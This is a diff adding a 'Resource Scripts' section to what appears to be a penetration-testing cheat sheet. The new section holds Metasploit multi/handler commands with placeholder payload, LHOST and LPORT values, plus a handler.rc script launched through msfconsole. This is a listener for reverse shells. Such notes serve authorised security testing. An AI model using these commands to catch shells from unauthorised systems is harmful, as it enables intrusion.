@@ -9,6 +9,7 @@
 
 # General
 - [Metasploit](#Metasploit)
+- [Resource Scripts](#Resource-Scripts)
 - [tmux](#tmux)
 - [windows-resources](#windows-resources)
 
@@ -70,6 +71,30 @@ vulns -p <port>
 ```
 ```
 connect <ip> <port>
+```
+
+## Resource Scripts
+```
+/usr/share/metasploit-framework/scripts/resource
+```
+```
+use multi/handler
+set payload <payload>
+set LHOST <ip>
+set LPORT <port>
+exploit
+```
+```
+vi handler.rc
+
+use multi/handler
+set PAYLOAD <payload>
+set LHOST <ip>
+set LPORT <port>
+exploit
+```
+```
+msfconsole -r handler.rc
 ```
 
 ## tmux
